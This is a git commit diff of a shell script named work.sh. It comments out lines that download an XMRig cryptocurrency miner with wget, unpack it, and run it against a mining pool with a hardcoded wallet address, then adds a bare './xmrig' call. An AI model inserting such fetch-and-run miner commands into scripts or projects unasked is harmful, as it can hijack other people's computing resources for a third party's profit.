b90c2a09d11fe264f041a178d493d0d4d3431a75
Lanawoods21 <103140836+Lanawoods21@users.noreply.github.com>
2022-04-07 03:05:12 +0530

    Update work.sh

--- work.sh
+++ work.sh
@@ -4,7 +4,8 @@
 #sudo apt update
 
  
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
-tar xvzf xmrig-6.16.4-focal-x64.tar.gz
-cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id Main
+#wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+#tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+#cd xmrig-6.16.4
+#./xmrig -o us-west.minexmr.com:443 -u 48tDH9mg5oDM6J6nLYyQYEBmy1ZCbPbLiF8rgWyssEVZ1CBcj9XqU4nSTsS3tpBTRq5WK28wEJqJ5SGmVFv2SvaN9X2ZDti -k --tls --rig-id Main
+./xmrig
